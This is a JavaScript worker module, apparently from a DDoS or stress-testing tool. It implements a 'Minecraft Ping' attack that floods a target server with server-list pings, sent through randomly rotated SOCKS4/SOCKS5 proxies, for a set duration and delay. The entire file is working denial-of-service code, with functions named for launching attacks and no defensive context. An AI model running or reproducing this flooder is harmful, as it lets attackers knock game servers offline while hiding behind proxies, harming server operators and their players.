import { parentPort, workerData } from "worker_threads";

import { pingMinecraftServer } from "../utils/mcUtils.js";

export const info = {
  id: "minecraft_ping",
  name: "Minecraft Ping",
  description: "Spams Minecraft server list pings.",
  supportedProtocols: ["socks4", "socks5"],
};

const startAttack = () => {
  const { target, proxies, duration, packetDelay } = workerData;

  const [targetHost, targetPort] = target.split(":");
  const parsedPort = parseInt(targetPort || "25565", 10);
  const fixedTarget = `tcp://${targetHost}:${parsedPort}`;

  let totalPackets = 0;
  const startTime = Date.now();

  const interval = setInterval(() => {
    const elapsedTime = (Date.now() - startTime) / 1000;

    if (elapsedTime >= duration) {
      clearInterval(interval);
      parentPort.postMessage({ log: { key: "attack_finished" }, totalPackets });
      process.exit(0);
    }

    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    pingMinecraftServer(targetHost, parsedPort, proxy)
      .then((status) => {
        totalPackets++;

        const players = status?.players?.online || 0;
        const max = status?.players?.max || 0;
        const version = status?.version?.name || "";
        const banner = `${version}: ${players}/${max}`;
        parentPort.postMessage({
          log: {
            key: "mc_ping_success",
            params: {
              proxy: `${proxy.protocol}://${proxy.host}:${proxy.port}`,
              target: fixedTarget,
              banner,
            },
          },
          totalPackets,
        });
      })
      .catch((e) => {
        parentPort.postMessage({
          log: {
            key: "mc_ping_failed",
            params: {
              proxy: `${proxy.protocol}://${proxy.host}:${proxy.port}`,
              target: fixedTarget,
              error: e.message,
            },
          },
          totalPackets,
        });
      });
  }, packetDelay);
};

if (workerData) {
  startAttack();
}
